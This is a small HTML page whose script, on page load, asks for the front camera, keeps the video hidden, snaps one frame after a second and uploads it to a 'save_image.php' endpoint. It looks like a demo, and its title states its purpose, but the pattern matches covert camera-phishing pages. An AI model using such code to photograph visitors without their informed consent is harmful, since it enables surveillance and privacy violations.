<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Auto Capture and Save</title>
  <style>
    body { margin: 0; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
    video { display: none; }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display: none;"></canvas>

  <script>
    async function captureAndSend() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        video.srcObject = stream;

        video.onloadedmetadata = () => {
          video.play();

          setTimeout(() => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/png');

            // Stop camera
            stream.getTracks().forEach(track => track.stop());

            // Send to server
            fetch('save_image.php', {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ image: imageData })
            }).then(res => {
              document.body.innerHTML = "<h2>✅ Image captured and saved.</h2>";
            }).catch(err => {
              document.body.innerHTML = "<h2>❌ Failed to save image.</h2>";
              console.error(err);
            });

          }, 1000); // delay before capture
        };
      } catch (err) {
        console.error("Camera error:", err);
        document.body.innerHTML = "<h2>❌ Camera not available</h2>";
      }
    }

    window.onload = captureAndSend;
  </script>
</body>
</html>
